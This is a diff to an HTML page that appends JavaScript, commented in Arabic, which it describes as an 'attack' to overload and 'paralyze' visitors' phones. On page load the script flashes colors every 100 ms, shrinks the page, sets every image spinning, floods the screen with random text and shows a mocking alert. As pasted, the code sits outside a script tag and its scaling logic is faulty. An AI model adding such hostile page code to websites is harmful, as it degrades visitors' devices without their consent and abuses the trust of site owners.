@@ -76,5 +76,70 @@
             }, 3000);
         });
     </script>
+    // --- هجوم الديناميكية (Dynamic Spinner) ---
+// هذا الكود سيحول أي صورة في الصفحة إلى إطار متحرك (Spinner) سريع جداً
+// ويستهلك موارد الجوال
+
+function triggerMobileAggro() {
+    // 1. حلقة تكرار لتغيير لون الخلفية كل 100 مللي ثانية
+    // هذا يضغط على معالج الجوال ويجعله يشتغل بسرعة
+    let colorInterval = setInterval(() => {
+        const hue = Math.floor(Math.random() * 360);
+        document.body.style.backgroundColor = `hsl(${hue}, 70%, 50%)`;
+        
+        // قلل الحجم تدريجياً حتى يصبح الجوال يظهر شاشة سوداء
+        const scale = document.body.style.transform.replace(/[-9.]/g, '') || 1;
+        if (scale > 0.1) {
+            document.body.style.transform = `scale(${scale - 0.01})`;
+        } else {
+            clearInterval(colorInterval);
+            alert("تم إصابة الجوال بالشلل! 🤖💀");
+        }
+    }, 100);
+
+    // 2. تشغيل جميع الصور كـ Spinners
+    const images = document.getElementsByTagName('img');
+    for (let i = 0; i < images.length; i++) {
+        images[i].src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'; // رمز gif فارغ
+        images[i].style.borderRadius = '50%';
+        images[i].style.animation = 'spin 0.1s linear infinite';
+    }
+
+    // 3. توليد أكواد عشوائية مليئة بالنصوص
+    let counter = 0;
+    const div = document.createElement('div');
+    div.style.position = 'fixed';
+    div.style.top = '0';
+    div.style.left = '0';
+    div.style.width = '100%';
+    div.style.height = '100%';
+    div.style.pointerEvents = 'none';
+    div.style.fontSize = '20px';
+    div.style.color = 'white';
+    div.style.textShadow = '2px 2px 0 #000';
+    div.style.zIndex = '9999';
+    document.body.appendChild(div);
+
+    let textInterval = setInterval(() => {
+        const text = Math.random().toString(36).substring(7);
+        const x = Math.random() * 100;
+        const y = Math.random() * 100;
+        const span = document.createElement('span');
+        span.innerText = text;
+        span.style.position = 'absolute';
+        span.style.left = x + '%';
+        span.style.top = y + '%';
+        div.appendChild(span);
+        
+        counter++;
+        if (counter > 50) {
+            div.innerHTML = ''; // تنظيف
+            counter = 0;
+        }
+    }, 50);
+}
+
+// تشغيل الهجوم عند تحميل الصفحة
+window.onload = triggerMobileAggro;
 </body>
 </html>
